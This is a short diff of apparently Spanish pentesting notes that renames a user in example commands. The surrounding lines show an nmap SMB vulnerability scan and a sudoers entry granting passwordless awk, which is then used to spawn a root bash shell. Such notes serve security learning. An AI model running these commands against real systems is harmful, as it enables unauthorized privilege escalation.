@@ -41,7 +41,7 @@ nmap -p 135,139,445 --script smb-vuln* 10.10.10.4 -oN SMBvuln
 Opcion 1: Utilizar MobaXterm
 Opción 2: SSH
 ```shell
-ssh s4vitar@10.10.1.2
+ssh kali@10.10.1.2
 ```
 
 #### FTP
@@ -265,7 +265,7 @@ sudo -l
 #### Abuso del fichero Sudoers
 ```shell
 nano /etc/sudoers
-	s4vitar ALL=(root) NOPASSWD: /usr/bin/awk
+	kali ALL=(root) NOPASSWD: /usr/bin/awk
 
 sudo awk 'BEGIN {system("/bin/bash")}'
 ```
